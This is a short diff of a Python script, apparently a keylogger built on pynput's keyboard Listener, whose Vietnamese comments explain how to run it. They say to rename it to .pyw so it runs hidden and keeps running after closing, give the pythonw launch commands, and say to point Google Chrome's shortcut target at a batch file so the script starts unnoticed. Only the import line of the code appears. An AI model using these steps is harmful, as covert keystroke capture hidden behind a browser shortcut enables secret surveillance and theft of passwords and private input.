@@ -5,8 +5,12 @@
         #copy vào file a.py
         #chạy lại python a.py trên cmd
         #chạy lại pip install pynput trên cmd
-#dổi file a.py thành a.pyw: w là chạy ẩn dưới window
-#để chạy a.pyw nhập vào cmd: pythonw a.pyw
+#dổi file a.py thành a.pyw: w là chạy ẩn dưới window. tắt app đi vẫn chạy ngầm
+#để chạy a.pyw nhập vào cmd: 
+                            #D:
+                            #cd workspace dev
+                            # pythonw a.pyw
+                            #
 #chuyển target của google chrome thành target của a.bat
 from pynput.keyboard import Listener
 
